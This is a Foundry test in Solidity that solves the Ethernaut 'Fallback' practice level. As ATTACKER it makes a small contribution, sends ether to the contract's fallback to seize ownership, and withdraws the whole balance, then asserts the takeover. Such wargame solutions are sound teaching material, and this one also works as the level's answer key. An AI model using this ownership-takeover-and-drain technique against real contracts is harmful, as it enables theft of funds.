// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "ethernaut/01Fallback.sol";
import {TestBase} from "test/TestBase.sol";

import {AttackContract} from "src/ethernaut/01Fallback.sol";

contract TestAttack is Test, TestBase {
    Fallback public instance;

    function setUp() public {
        vm.startPrank(OWNER);
        instance = new Fallback(); // create new challenge instance
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(ATTACKER);

        vm.deal(ATTACKER, 20 wei);
        instance.contribute{value: 10 wei}();

        (bool success, ) = address(instance).call{value: 10 wei}("");
        require(success, "Failed to transfer ether");
        instance.withdraw();

        vm.stopPrank();

        assertEq(instance.owner(), ATTACKER);
        assertEq(address(instance).balance, 0 wei);
    }
}
